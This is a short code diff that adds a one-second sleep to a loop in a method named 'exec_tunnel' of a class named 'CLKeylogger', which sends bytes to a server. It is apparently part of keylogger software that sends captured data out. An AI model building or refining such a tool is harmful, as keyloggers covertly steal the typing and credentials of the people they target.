@@ -17,5 +17,6 @@ void CLKeylogger::exec_tunnel() {
         } else {
             printf("Sent %d bytes to server\n", rc);
         }
+        sleep(1);
     }
 }
